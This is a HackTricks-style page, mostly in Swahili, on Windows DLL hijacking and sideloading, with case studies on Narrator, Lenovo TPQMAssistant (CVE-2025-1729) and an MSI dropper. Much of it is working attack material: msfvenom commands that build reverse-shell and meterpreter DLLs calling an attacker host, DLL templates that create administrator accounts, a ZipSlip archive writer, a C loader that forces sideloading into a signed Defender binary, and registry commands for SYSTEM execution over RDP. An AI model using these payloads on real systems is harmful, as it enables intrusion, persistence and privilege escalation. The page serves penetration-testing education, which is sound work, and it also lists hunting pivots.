# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking inahusisha kudanganya application inayoaminika ili kupakia malicious DLL. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Mara nyingi hutumika kwa code execution, kupata persistence, na mara chache zaidi, privilege escalation. Licha ya mkazo hapa kuwa kwenye escalation, mbinu ya hijacking hubaki ile ile katika malengo yote.

### Common Techniques

Mbinu kadhaa hutumiwa kwa DLL hijacking, na kila moja ufanisi wake hutegemea DLL loading strategy ya application:

1. **DLL Replacement**: Kubadilisha genuine DLL na malicious moja, kwa hiari ukitumia DLL Proxying ili kuhifadhi functionality ya asili ya DLL.
2. **DLL Search Order Hijacking**: Kuweka malicious DLL kwenye search path kabla ya ile halali, na kutumia application's search pattern.
3. **Phantom DLL Hijacking**: Kuunda malicious DLL kwa application ili ipakie, ikidhani ni required DLL isiyokuwepo.
4. **DLL Redirection**: Kurekebisha search parameters kama `%PATH%` au `.exe.manifest` / `.exe.local` files ili kuelekeza application kwenye malicious DLL.
5. **WinSxS DLL Replacement**: Kubadilisha legitimate DLL na counterpart yake mbaya ndani ya WinSxS directory, mbinu ambayo mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka malicious DLL kwenye user-controlled directory pamoja na application iliyonakiliwa, ikifanana na Binary Proxy Execution techniques.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kuifanya trusted **.NET Framework** process ipakie attacker code. Ikiwa target executable ni application ya **managed**, CLR pia huangalia **application configuration file** inayoitwa kwa jina la executable (kwa mfano `Setup.exe.config`). Faili hilo linaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye attacker-controlled assembly iliyowekwa kando ya EXE, CLR hui pakia **kabla ya application's normal code path** na kuiendesha ndani ya trusted process.

Kwa mujibu wa Microsoft .NET Framework configuration schema, `<appDomainManagerAssembly>` na `<appDomainManagerType>` vyote lazima viwepo ili custom manager itumike.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- Hii ni tradecraft mahsusi ya **.NET Framework**. Inategemea uchambuzi wa CLR config, si Win32 DLL search order.
- Host lazima iwe kweli ni **managed EXE**. Uhakiki wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
- Jina la config lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwekwa **karibu na EXE**.
- Hii ni muhimu pamoja na **signed Microsoft/vendor binaries** kwa sababu trusted EXE hubaki bila kuguswa wakati malicious managed assembly inatekelezwa ndani ya mchakato huo.
- Ukiwa tayari una writable installer/update directory, AppDomainManager hijacking inaweza kutumika kama **first stage**, ikifuatiwa na classic DLL sideloading au reflective loading kwa stages za baadaye.

### Hijacking existing scheduled task ili relaunch sideload chain

Kwa persistence, usitafute tu **creating a new task**. Baadhi ya intrusion sets husubiri hadi legitimate installer itengeneze **normal updater task** kisha hu**rewrite task action** ili existing name, author, na trigger zibaki za kawaida kwa defenders.

Reusable workflow:
1. Install/run legitimate software na tambua task ambayo kawaida huunda.
2. Export task XML na andika current `<Exec><Command>` / `<Arguments>` values.
3. Badilisha tu action ili task ianze **trusted host EXE** yako kutoka kwa user-writable staging directory, ambayo kisha hu side-load au AppDomain-load payload halisi.
4. Re-register task ile ile badala ya kuunda mpya, artifact ya persistence inayoonekana wazi.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Kenapa hii ni stealthier:
- Task name bado inaweza kuonekana halali (kwa mfano vendor updater).
- **Task Scheduler service** hui-launch, hivyo parent/ancestor validation mara nyingi huona chain ya scheduling inayotarajiwa badala ya `explorer.exe`.
- Timu za DFIR ambazo hutafuta tu **new task names** zinaweza kukosa task ambayo registration yake tayari ilikuwepo lakini action yake sasa inaelekeza kwa `%LOCALAPPDATA%`, `%APPDATA%`, au path nyingine inayodhibitiwa na attacker.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha `C:\Windows\System32\Tasks\*` XML na `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata dhidi ya baseline.
- Toa alert wakati **vendor-looking updater task** ina-execute kutoka **user-writable directories** au ina-launch .NET EXE yenye faili `*.config` iliyo kando yake.

> [!TIP]
> Kwa step-by-step chain inayolayer HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, pitia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Njia ya kawaida zaidi ya kupata missing Dlls ndani ya system ni ku-run [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ku-set** **filters 2 zifuatazo**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

na kisha onyesha tu **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Kama unatafuta **missing dlls kwa ujumla** acha hii i-run kwa **seconds** kadhaa.\
Kama unatafuta **missing dll ndani ya executable fulani**, unapaswa ku-set **filter nyingine kama "Process Name" "contains" `<exec name>`, i-execute, na kusimamisha capturing events**.

## Exploiting Missing Dlls

Ili ku-escalate privileges, nafasi bora tuliyo nayo ni kuweza **kuandika dll ambayo privilege process itajaribu ku-load** kwenye baadhi ya **place ambapo ita-searchwa**. Hivyo, tutaweza **kuandika** dll kwenye **folder** ambapo **dll inatafutwa kabla** ya folder iliyo na **original dll** (weird case), au tutaweza **kuandika kwenye folder fulani ambapo dll itatafutwa** na original **dll haipo** kwenye folder yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dlls zinavyo-load specifically.**

**Windows applications** hutafuta DLLs kwa kufuata seti ya **pre-defined search paths**, kwa mpangilio maalum. Tatizo la DLL hijacking hutokea wakati DLL yenye madhara inawekwa kimkakati katika mojawapo ya directories hizi, kuhakikisha inaloaddiwa kabla ya authentic DLL. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inaporeference DLLs inazohitaji.

Unaweza kuona **DLL search order kwenye 32-bit** systems hapa chini:

1. Directory ambayo application ililoaddiwa kutoka humo.
2. System directory. Tumia [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function kupata path ya directory hii.(_C:\Windows\System32_)
3. 16-bit system directory. Hakuna function inayopata path ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function kupata path ya directory hii.
1. (_C:\Windows_)
5. Current directory.
6. Directories ambazo zimeorodheshwa kwenye PATH environment variable. Kumbuka kuwa hii haijumuishi per-application path iliyobainishwa na **App Paths** registry key. Key ya **App Paths** haitumiki wakati wa kuhesabu DLL search path.

Hiyo ndiyo **default** search order ikiwa **SafeDllSearchMode** imewezeshwa. Iwapo imezimwa current directory hupanda hadi nafasi ya pili. Ili kuzima feature hii, tengeneza registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiset kwa 0 (default ni enabled).

Kama [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function imeitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** search huanza kwenye directory ya executable module ambayo **LoadLibraryEx** ina-load.

Mwisho, kumbuka kuwa **dll inaweza ku-loadiwa kwa kuonyesha absolute path badala ya jina tu**. Katika hali hiyo dll hiyo **ita-searchwa tu kwenye path hiyo** (kama dll ina dependencies, nazo zita-searchwa kana kwamba zime-loadiwa kwa jina tu).

Kuna njia nyingine za kubadili ways to alter the search order lakini sitaeleza hapa.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Tumia **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process inajaribu lakini haiwezi kuyapata.
2. Ikiwa binary ina-run kwa **schedule/service**, kudondosha DLL yenye mojawapo ya majina hayo kwenye **application directory** (search-order entry #1) italoaddiwa kwenye execution inayofuata. Katika case moja ya .NET scanner process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya ku-load copy halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (mfano reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Kama primitive yako ni **ZipSlip-style arbitrary write**, tengeneza ZIP whose entry escapes the extraction dir ili DLL iangukie kwenye app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kudhibiti kwa uhakika DLL search path ya process mpya ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia ntdll native APIs. Kwa kutoa directory inayodhibitiwa na mshambuliaji hapa, target process inayohusisha imported DLL kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia malicious DLL kutoka kwenye directory hiyo.

Key idea
- Tengeneza process parameters kwa RtlCreateProcessParametersEx na toa custom DllPath inayoelekeza kwenye folder yako unayodhibiti (mfano, directory ambamo dropper/unpacker yako inaishi).
- Unda process kwa RtlCreateUserProcess. Wakati target binary inapotatua DLL kwa jina, loader itatazama DllPath hii iliyotolewa wakati wa resolution, ikiwezesha sideloading ya kuaminika hata kama malicious DLL haipo pamoja na target EXE.

Notes/limitations
- Hii huathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri current process pekee.
- Target lazima import au LoadLibrary DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na hardcoded absolute paths haziwezi hijacked. Forwarded exports na SxS vinaweza kubadilisha precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya uendeshaji
- Weka xmllite.dll mbaya (ikitoa functions zinazohitajika au ikiproxy kwa halisi) kwenye saraka yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyo hapo juu. loader hutatua import kupitia DllPath iliyotolewa na kupakia DLL yako.

Mbinu hii imeonekana katika mazingira halisi ikitumiwa kuendesha mfululizo wa sideloading wa hatua nyingi: launcher ya awali hudondosha helper DLL, ambayo kisha huanzisha binary ya Microsoft iliyosainiwa, inayoweza hijack, ikiwa na custom DllPath ili kulazimisha kupakiwa kwa DLL ya mshambuliaji kutoka saraka ya staging.


#### Exceptions on dll search order from Windows docs

Baadhi ya exceptions kwa standard DLL search order zimetajwa katika Windows documentation:

- Wakati **DLL ambayo inashiriki jina lake na nyingine tayari iliyopakiwa kwenye memory** inapokutwa, mfumo hupita search ya kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwenye DLL tayari iliyopo kwenye memory. **Katika hali hii, mfumo haufanyi search ya DLL**.
- Katika hali ambapo DLL hutambuliwa kama **known DLL** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la known DLL, pamoja na DLL zake tegemezi, **bila kupitia mchakato wa search**. registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** huhifadhi orodha ya known DLLs hizi.
- Iwapo **DLL ina dependencies**, search ya dependent DLLs hizi hufanywa kana kwamba zimetajwa tu kwa **module names** zao, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Escalating Privileges

**Mahitaji**:

- Tambua process inayofanya kazi au itakayofanya kazi chini ya **privileges tofauti** (horizontal au lateral movement), ambayo **inakosa DLL**.
- Hakikisha kuna **write access** kwa **directory** yoyote ambayo **DLL** itatafutwa humo. Eneo hili linaweza kuwa directory ya executable au directory ndani ya system path.

Ndiyo, mahitaji haya ni magumu kuyapata kwa sababu **kwa default ni ajabu sana kupata executable yenye privilege ikikosa dll** na ni **zaidi ya ajabu** kuwa na write permissions kwenye folder ya system path (kwa default huwezi). Lakini, katika mazingira yaliyosanidiwa vibaya hii inawezekana.\
Iwapo una bahati na ukajikuta unakidhi mahitaji haya, unaweza kuangalia project ya [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la project ni bypass UAC**, unaweza kupata humo **PoC** ya Dll hijaking kwa toleo la Windows ambalo unaweza kutumia (huenda ukibadili tu path ya folder ambako una write permissions).

Kumbuka kuwa unaweza **kuangalia permissions zako kwenye folder** ukifanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **kagua ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili wa jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa ya kuandika kwenye folda ya **System Path** angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za automated zinazovutia kugundua vulnerability hii ni vitendaji vya **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Example

Ikiwa unapata scenario inayoweza kutumiwa vibaya, moja ya mambo muhimu zaidi ili kuifanikisha itakuwa ni **kuunda dll inayosafirisha angalau functions zote ambazo executable itai-import kutoka kwayo**. Hata hivyo, kumbuka kuwa Dll Hijacking inafaa sana ili [kupanda kutoka Medium Integrity level hadi High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda valid dll** ndani ya utafiti huu wa dll hijacking unaolenga dll hijacking kwa execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll yenye non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Kimsingi **Dll proxy** ni Dll inayoweza **kutekeleza malicious code yako inapopakiwa** lakini pia **kuonyesha** na **kufanya kazi** kama **ilivyotarajiwa** kwa **kupeleka calls zote kwenye real library**.

Kwa zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **kuelekeza executable na kuchagua library** unayotaka proxify na **kuzalisha proxified dll** au **kuelekeza Dll** na **kuzalisha proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika hali kadhaa Dll unayokompaili lazima **i-export functions kadhaa** ambazo zita-loadiwa na victim process, ikiwa functions hizi hazipo **binary haitaweza ku-load** hizo na **exploit itashindwa**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL ya C ya mbadala yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Uchunguzi wa Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado hujaribu probe DLL ya localization inayotabirika, mahususi kwa lugha, wakati wa kuanza ambayo inaweza hijacked kwa arbitrary code execution na persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa kuna writable attacker-controlled DLL katika OneCore path, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` inatekelezwa. Hakuna exports zinazohitajika.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Hijack ya juujuu itasababisha UI kuongea/kuelezwa. Ili kubaki kimya, wakati wa attach orodhesha threads za Narrator, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` hiyo; endelea katika thread yako mwenyewe. Tazama PoC kwa code kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa yaliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandikizwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP kwenye host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuzindua Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji unasimama wakati session ya RDP inafungwa—fanya inject/migrate mara moja.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili registry entry ya built-in Accessibility Tool (AT) (mfano, CursorIndicator), kuibadilisha ili ielekeze kwenye binary/DLL yoyote, kuiimport, kisha kuweka `configuration` kuwa jina hilo la AT. Hii hufanya proxy ya utekelezaji wowote chini ya framework ya Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha maadili ya HKLM kunahitaji admin rights.
- Mantiki yote ya payload inaweza kuwepo ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), kinachofuatiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` iliyopo `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM chini ya context ya user aliyeingia.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, ikiruhusu local users kuweka files za aina yoyote.
- **DLL Search Behavior**: Hujaribu kupakia `hostfxr.dll` kutoka kwenye working directory yake kwanza na huandika "NAME NOT FOUND" ikiwa haipo, ikionyesha local directory search precedence.

### Exploit Implementation

Attacker anaweza kuweka malicious `hostfxr.dll` stub kwenye directory hiyo hiyo, akitumia DLL inayokosekana kupata code execution chini ya context ya user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kama mtumiaji wa kawaida, drop `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshe saa 9:30 AM chini ya context ya mtumiaji wa sasa.
3. Ikiwa administrator ameingia wakati task inatekelezwa, malicious DLL ita-run ndani ya session ya administrator kwa medium integrity.
4. Chain standard UAC bypass techniques ili kupandisha kutoka medium integrity hadi SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors mara nyingi huunganisha MSI-based droppers na DLL side-loading ili kutekeleza payloads chini ya trusted, signed process.

Chain overview
- User hupakua MSI. CustomAction ina-run kimya kimya wakati wa GUI install (kwa mfano, LaunchApplication au hatua ya VBScript), kisha reconstructing next stage kutoka embedded resources.
- Dropper huandika legitimate, signed EXE na malicious DLL kwenye directory moja (mfano: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wakati signed EXE inaanzishwa, Windows DLL search order hupakia wsc.dll kutoka working directory kwanza, na kutekeleza attacker code chini ya signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Angalia entries zinazowasha executables au VBScript. Mfano wa suspicious pattern: LaunchApplication inayotekeleza embedded file kwa background.
- Katika Orca (Microsoft Orca.exe), kagua CustomAction, InstallExecuteSequence na Binary tables.
- Embedded/split payloads ndani ya MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta fragments nyingi ndogo zinazounganishwa na decrypted na VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili katika folda ile ile:
- wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: DLL ya mshambuliaji. Ikiwa hakuna exports mahususi zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na forward exports zinazohitajika kwenda kwenye library halisi huku ukitekeleza payload ndani ya DllMain.
- Tengeneza minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia proxying framework (kwa mfano DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia hutekeleza payload yako.

